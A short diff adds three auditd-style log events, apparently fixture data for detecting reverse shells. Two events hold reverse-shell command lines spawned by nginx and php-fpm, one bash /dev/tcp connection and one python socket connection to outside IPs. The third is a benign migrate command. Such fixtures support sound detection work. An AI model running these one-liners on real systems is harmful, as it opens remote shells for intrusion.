@@ -1,0 +1,3 @@
+{"_time": "2026-06-20T15:00:00", "index": "endpoint", "sourcetype": "linux:auditd", "host": "web-prod-01", "user": "www-data", "parent_process_name": "nginx", "CommandLine": "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"}
+{"_time": "2026-06-20T15:01:00", "index": "endpoint", "sourcetype": "linux:auditd", "host": "web-prod-02", "user": "www-data", "parent_process_name": "php-fpm", "CommandLine": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"203.0.113.8\",9001))'"}
+{"_time": "2026-06-20T15:02:00", "index": "endpoint", "sourcetype": "linux:auditd", "host": "app-01", "user": "deploy", "parent_process_name": "sshd", "CommandLine": "python3 manage.py migrate"}
